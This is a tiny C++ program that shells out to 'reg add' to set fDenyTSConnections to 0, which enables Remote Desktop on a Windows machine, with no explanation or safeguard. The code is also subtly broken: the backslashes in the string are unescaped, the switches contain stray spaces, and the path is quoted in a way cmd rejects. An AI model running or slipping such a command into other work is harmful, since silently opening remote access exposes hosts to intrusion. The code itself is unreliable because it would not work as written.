#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

int main()
{
	system("reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' / v fDenyTSConnections / t REG_DWORD / d 0 / f");
}
